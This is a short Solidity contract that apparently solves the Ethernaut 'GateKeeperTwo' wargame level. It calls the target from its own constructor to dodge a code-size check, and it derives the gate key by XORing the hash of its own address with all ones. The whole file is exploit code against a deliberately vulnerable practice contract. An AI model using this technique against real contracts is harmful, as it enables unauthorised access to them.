// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface GateKeeperTwo {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GateKeeperTwoHack {

    constructor(address _gateKeeperTwo)  {
        GateKeeperTwo gateKeeperTwo = GateKeeperTwo(_gateKeeperTwo);
        bytes8 key;
     
        unchecked {
             key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ (uint64(0) - 1)) ;
        }
        gateKeeperTwo.enter(key);
    }
}